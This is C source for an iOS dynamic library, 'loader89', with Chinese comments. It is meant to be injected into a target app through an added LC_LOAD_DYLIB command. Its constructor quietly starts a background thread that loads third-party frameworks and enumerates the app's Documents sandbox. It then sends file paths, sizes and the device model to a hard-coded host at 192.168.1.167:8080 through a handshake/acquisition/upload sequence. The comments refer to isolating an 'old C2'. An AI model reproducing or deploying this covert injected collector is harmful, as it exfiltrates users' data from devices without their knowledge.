/* loader89.c - 89yl 三件套通用加载器 v1
 * LOADER89_SKIP_CORE=1: 隔离测试，不加载 libwebuiopsercore，只加载 SDWebuiopser
 * 注入方式: 目标主二进制加 LC_LOAD_DYLIB @executable_path/loader89.dylib
 * 行为: 构造器 -> pthread 后台线程 -> sleep(3) -> dlopen(core+SD) ->
 *       [[CSDataExchange alloc] initWithHost:port:443] -> handshake ->
 *       startAcquisition:filesystem -> uploadChunk(collection_sample.json) ->
 *       endAcquisition -> endSession
 * 失败安全: 任何失败只写日志, 不影响宿主
 */
typedef unsigned long u64;
typedef long i64;

extern void *dlopen(const char *, int);
extern void *dlsym(void *, const char *);
extern void *malloc(unsigned long);
extern void free(void *);
extern void *memcpy(void *, const void *, unsigned long);
extern unsigned long strlen(const char *);
extern int snprintf(char *, unsigned long, const char *, ...);
extern int open(const char *, int, ...);
extern int close(int);
extern long write(int, const void *, unsigned long);
extern unsigned int sleep(unsigned int);
extern long time(void *);
extern int pthread_create(void *, const void *, void *(*)(void *), void *);
extern int pthread_detach(void *);

#define RTLD_DEFAULT ((void *)-2)
#define O_WRONLY 1
#define O_CREAT 0x200
#define O_APPEND 8
#define O_TRUNC 0x400
#define DT_DIR 4

/* 隔离诊断开关：1=跳过 core，验证旧 C2 是否来自 libwebuiopsercore */
#define LOADER89_SKIP_CORE 1

#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>

static void *(*p_dlsym)(void *, const char *);
static void *(*p_msgSend)();
static void *(*p_getClass)(const char *);
static void *(*p_sel)(const char *);

static int g_logfd = -1;

static void *(*p_nslog)();

static void log_str(const char *s) {
    if (g_logfd >= 0) { write(g_logfd, s, strlen(s)); write(g_logfd, "\n", 1); }
    /* NSLog: 无越狱时用爱思助手"实时日志"直接可见 */
    if (p_nslog && p_getClass && p_msgSend && p_sel) {
        void *nsstring = p_getClass("NSString");
        if (nsstring) {
            void *s2 = p_msgSend(nsstring, p_sel("stringWithUTF8String:"), (char *)s);
            if (s2) p_nslog(s2);
        }
    }
}
static void log_u64(const char *tag, u64 v) {
    char buf[96];
    snprintf(buf, sizeof(buf), "%s%llu", tag, (unsigned long long)v);
    log_str(buf);
}

static char *cat3(const char *a, const char *b, const char *c) {
    unsigned long n = strlen(a) + strlen(b) + strlen(c) + 1;
    char *p = (char *)malloc(n);
    unsigned long i = 0, j;
    for (j = 0; a[j]; j++) p[i++] = a[j];
    for (j = 0; b[j]; j++) p[i++] = b[j];
    for (j = 0; c[j]; j++) p[i++] = c[j];
    p[i] = 0;
    return p;
}

static void json_escape(char *dst, unsigned long dstn, const char *src) {
    unsigned long i = 0, o = 0;
    while (src[i] && o + 6 < dstn) {
        char c = src[i];
        if (c == '"' || c == '\\') { dst[o++] = '\\'; dst[o++] = c; }
        else if (c >= 0x20 && (unsigned char)c < 0x80) dst[o++] = c;
        else { dst[o++] = '?'; }
        i++;
    }
    dst[o] = 0;
}

/* 递归枚举目录, 输出 {path,size} JSON 数组片段; used 既是读写游标 */
static int walk_dir(const char *base, const char *rel, char *out, unsigned long *used,
                    unsigned long outn, int max_files, int depth) {
    if (depth > 3 || max_files <= 0 || *used + 1 >= outn) return 0;
    char *full = rel[0] ? cat3(base, "/", rel) : cat3(base, "", "");
    DIR *dir = opendir(full);
    free(full);
    if (!dir) return 0;
    int count = 0;
    struct dirent *e;
    while ((e = (struct dirent *)readdir(dir)) && count < max_files) {
        const char *nm = e->d_name;
        if (nm[0] == '.' && (nm[1] == 0 || (nm[1] == '.' && nm[2] == 0))) continue;
        char *r2 = rel[0] ? cat3(rel, "/", nm) : (char *)nm;
        char *path = cat3(base, "/", r2);
        struct stat st;
        if (lstat(path, &st) == 0) {
            if ((st.st_mode & 0xF000) == 0x4000) { /* dir; 递归内部会自动加逗号 */
                count += walk_dir(base, r2, out, used, outn, max_files - count, depth + 1);
            } else {
                char jp[512], esc[400];
                json_escape(esc, sizeof(esc), r2);
                int n = snprintf(jp, sizeof(jp), "{\"path\":\"%s\",\"size\":%lld}", esc, (long long)st.st_size);
                if (n > 0 && *used + (unsigned long)n + 2 < outn) {
                    if (*used > 0) out[(*used)++] = ',';
                    for (int k = 0; k < n; k++) out[(*used)++] = jp[k];
                    count++;
                }
            }
        }
        if (r2 != (char *)nm) free(r2);
        free(path);
    }
    closedir(dir);
    if (*used < outn) out[*used] = 0;
    return count;
}
static void *worker(void *arg) {
    (void)arg;
    sleep(3);
    char *home = (char *)0;
    /* getenv */
    extern char *getenv(const char *);
    home = getenv("HOME");
    char *logpath = cat3(home ? home : "/var/mobile", "/Documents/loader89.log", "");
    g_logfd = open(logpath, O_WRONLY | O_CREAT | O_APPEND, 0644);
    free(logpath);
    /* 2. objc runtime */
    p_dlsym = (void *(*)(void *, const char *))dlsym(RTLD_DEFAULT, "dlsym");
    p_msgSend = (void *(*)())dlsym(RTLD_DEFAULT, "objc_msgSend");
    p_getClass = (void *(*)(const char *))dlsym(RTLD_DEFAULT, "objc_getClass");
    p_sel = (void *(*)(const char *))dlsym(RTLD_DEFAULT, "sel_registerName");
    p_nslog = (void *(*)())dlsym(RTLD_DEFAULT, "NSLog");
    if (!p_msgSend || !p_getClass || !p_sel) { log_str("objc runtime missing"); return 0; }

    log_str("=== loader89 v2 start ===");

    /* 1. dlopen 核心与上传库 */
#if LOADER89_SKIP_CORE
    void *core = 0;
    log_str("dlopen core SKIPPED (diagnostic)");
#else
    void *core = dlopen("@executable_path/Frameworks/libwebuiopsercore.framework/libwebuiopsercore", 0xA);
    log_str(core ? "dlopen core OK" : "dlopen core FAIL");
#endif
    void *sd = dlopen("@executable_path/Frameworks/SDWebuiopser.framework/SDWebuiopser", 0xA);
    log_str(sd ? "dlopen SD OK" : "dlopen SD FAIL");
    if (!core && !sd) { log_str("no components, exit"); return 0; }

    void *cls = p_getClass("_CSDataExchange");
    log_str(cls ? "CSDataExchange class OK" : "CSDataExchange class MISSING");
    if (!cls) return 0;

    void *nsstring = p_getClass("NSString");
    void *sel_str_u8 = p_sel("stringWithUTF8String:");
    #define NSSTR(cstr) p_msgSend(nsstring, sel_str_u8, (char *)(cstr))

    void *inst = p_msgSend(cls, p_sel("alloc"));
    inst = p_msgSend(inst, p_sel("initWithHost:port:"), NSSTR("192.168.1.167"), (void *)8080L);
    log_str(inst ? "instance OK" : "instance FAIL");
    if (!inst) return 0;

    /* 3. handshake */
    void *err = 0;
    long ok = (long)p_msgSend(inst, p_sel("handshakeWithError:"), &err);
    log_str(ok ? "handshake OK" : "handshake FAIL");
    if (!ok) return 0;

    /* 4. startAcquisition:filesystem */
    err = 0;
    long ok2 = (long)p_msgSend(inst, p_sel("startAcquisition:error:"), NSSTR("filesystem"), &err);
    log_str(ok2 ? "startAcquisition OK" : "startAcquisition FAIL");
    if (!ok2) return 0;

    /* 5. 采沙盒样本 -> collection_sample.json */
    char files[24576];
    files[0] = 0;
    unsigned long used = 0;
    int nfiles = 0;
    if (home) {
        char *docs = cat3(home, "/Documents", "");
        nfiles = walk_dir(docs, "", files, &used, sizeof(files), 200, 0);
        free(docs);
        log_u64("sandbox files=", (u64)nfiles);
    }
    char *model = "unknown";
    extern int sysctlbyname(const char *, void *, unsigned long *, void *, unsigned long);
    char mbuf[64];
    unsigned long mlen = sizeof(mbuf);
    if (sysctlbyname("hw.machine", mbuf, &mlen, 0, 0) == 0) model = mbuf;

    char ts[32];
    snprintf(ts, sizeof(ts), "%lld", (long long)time(0));
    char *body = (char *)malloc(24576);
    unsigned long bo = 0;
    int n = 0;
    n = snprintf(body + bo, 24576 - bo,
        "{\"deviceName\":\"%s\",\"model\":\"%s\",\"systemName\":\"iOS\",\"systemVersion\":\"\","
        "\"identifierForVendor\":\"\",\"appBundle\":\"\",\"appVersion\":\"\",\"collectedAt\":%s,"
        "\"sandboxFiles\":[", "device", model, ts);
    bo += n;
    for (unsigned long k = 0; k < used && bo < 24000; k++) body[bo++] = files[k];
    n = snprintf(body + bo, 24576 - bo, "]}");
    bo += n;
    log_u64("json bytes=", (u64)bo);

    void *nsdata = p_getClass("NSData");
    void *data = p_msgSend(nsdata, p_sel("dataWithBytes:length:"), body, (unsigned long)bo);
    free(body);
    if (!data) { log_str("NSData FAIL"); return 0; }

    /* 6. uploadChunk */
    err = 0;
    long ok3 = (long)p_msgSend(inst, p_sel("uploadChunk:acquisitionType:fileName:error:"),
                               data, NSSTR("filesystem"), NSSTR("collection_sample.json"), &err);
    log_str(ok3 ? "uploadChunk OK" : "uploadChunk FAIL");

    /* 7. endAcquisition + endSession */
    err = 0;
    p_msgSend(inst, p_sel("endAcquisition:error:"), NSSTR("filesystem"), &err);
    err = 0;
    p_msgSend(inst, p_sel("endSessionWithError:"), &err);
    log_str("=== loader89 done ===");
    if (g_logfd >= 0) { close(g_logfd); g_logfd = -1; }
    return 0;
}

static void *g_thread_start;

__attribute__((constructor))
static void loader89_init(void) {
    /* 在后台线程跑, 不阻塞宿主启动 */
    static void *th;
    void *(*fn)(void *) = worker;
    g_thread_start = (void *)fn;
    if (pthread_create(&th, 0, worker, 0) == 0) {
        pthread_detach(th);
    }
}
